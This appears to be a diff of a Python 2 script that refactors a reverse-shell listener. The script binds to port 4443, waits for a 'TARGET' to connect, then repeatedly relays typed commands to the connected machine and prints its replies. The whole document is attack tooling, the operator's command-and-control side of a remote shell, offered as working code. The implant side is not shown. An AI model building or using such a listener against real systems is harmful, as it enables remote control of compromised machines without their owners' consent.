@@ -1,24 +1,33 @@
-import socket
+from socket import *
+import sys
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+HOST = ''
+PORT = 4443
 
-sock.bind(('', 4443))
+S = socket(AF_INET, SOCK_STREAM)
+S.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+S.bind((HOST, PORT))
 
-sock.listen(10)
+print "LISTENING ON 0.0.0.0:%s" % str(PORT)
 
-print "watiing for client "
+S.listen(10)
+(client, (ip, port)) = S.accept()
 
-(client, (ip, port)) = sock.accept()
-
-print 'Received connaction from:', ip
-data = client.recv(1024)
+print "TARGET CONNECTED BY ", ip
 
 while True:
+    data = client.recv(1024)
 
-    print data
+    cmd = raw_input(data)
 
-    cmd = raw_input()
-    client.send(cmd)
-    print data
+    if cmd == 'quit' or cmd == 'q':
+        break
+
+    if cmd == 'exit':
+        break
+
+    if cmd:
+        client.sendall('{}\n'.format(cmd).encode('utf-8'))
+    else:
+        continue
 client.close()
